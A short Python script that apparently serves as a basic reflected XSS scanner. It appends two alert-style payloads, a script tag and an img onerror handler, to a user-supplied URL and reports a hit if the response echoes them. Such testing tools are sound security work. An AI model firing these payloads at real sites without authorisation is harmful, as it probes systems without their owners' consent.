import requests


def fuzz ( url ) :
	"""

	:param url:
	:type url:
	:return:
	:rtype:
	"""
	# Define a list of fuzzing payloads
	payloads = ['<script>alert("XSS")</script>' , '<img src=x onerror=alert("XSS")>']

	# Send a request to the URL with each payload
	for payload in payloads :
		response = requests.get ( url + payload )

		# Check if the response contains the payload
		if payload in response.text :
			return True
	return False


def main () :
	"""

	"""
	url = input ( 'Enter the URL to fuzz: ' )
	if fuzz ( url ) :
		print ( 'XSS vulnerability found!' )
	else :
		print ( 'No XSS vulnerability found.' )


if __name__ == "__main__" :
	main ( )
